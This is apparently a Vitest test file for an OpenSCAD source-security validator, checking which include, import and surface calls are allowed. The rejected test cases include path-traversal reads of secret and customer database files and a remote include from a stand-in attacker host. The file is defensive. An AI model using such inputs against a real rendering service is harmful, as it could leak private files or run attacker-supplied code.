import { describe, expect, it } from 'vitest';
import { validateScadExecutionSource } from './sourceSecurity';

describe('OpenSCAD execution source security', () => {
  it('allows deterministic primitives and trusted BOSL2 modules', () => {
    expect(validateScadExecutionSource(
      'include <BOSL2/std.scad>\ninclude <BOSL2/gears.scad>\ndifference(){cube(10);cylinder(h=10,r=2);}',
      { hasImportStl: false },
    )).toEqual({ ok: true });
  });

  it.each([
    'include <../../secret.scad>\ncube(1);',
    'use <C:/private/tool.scad>\ncube(1);',
    'include <https://attacker.test/payload.scad>\ncube(1);',
    'include(str("BOSL2/", name));',
  ])('rejects untrusted or dynamic include: %s', source => {
    expect(validateScadExecutionSource(source, { hasImportStl: false })).toMatchObject({ ok: false, reason: 'UNTRUSTED_INCLUDE' });
  });

  it('allows only the server-provided model.stl import', () => {
    expect(validateScadExecutionSource('import("model.stl");', { hasImportStl: true })).toEqual({ ok: true });
    expect(validateScadExecutionSource('import("../../customer.db");', { hasImportStl: true })).toMatchObject({ ok: false, reason: 'UNTRUSTED_IMPORT' });
    expect(validateScadExecutionSource('import("model.stl");', { hasImportStl: false })).toMatchObject({ ok: false, reason: 'UNTRUSTED_IMPORT' });
  });

  it('rejects surface file reads and ignores harmless comment text', () => {
    expect(validateScadExecutionSource('surface(file="../../secret.dat");', { hasImportStl: false })).toMatchObject({ ok: false, reason: 'EXTERNAL_SURFACE' });
    expect(validateScadExecutionSource('// import("secret")\ncube(1);', { hasImportStl: false })).toEqual({ ok: true });
  });
});
